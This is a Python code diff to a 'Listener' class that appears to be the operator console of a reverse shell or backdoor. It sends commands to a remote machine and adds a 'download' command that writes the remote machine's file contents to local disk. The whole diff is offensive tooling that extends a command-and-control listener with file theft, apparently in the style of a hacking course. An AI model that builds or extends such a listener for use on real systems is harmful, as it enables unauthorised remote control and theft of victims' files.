@@ -26,7 +26,14 @@ class Listener:
             except ValueError:
                 continue
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return file.read()
 
+    def write_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(content)
+            return "[+] Download successful"
 
     def execute_remotely(self,command):
         self.reliable_send(command)
@@ -39,6 +46,10 @@ class Listener:
         while True:
             user_input=raw_input(">> ").split(' ')
             result = self.execute_remotely(user_input)
+            if user_input[0] == "download":
+                # result = self.write_file("test.txt",result)
+                result = self.write_file(user_input[1],result)
+
             print(result)
 
 
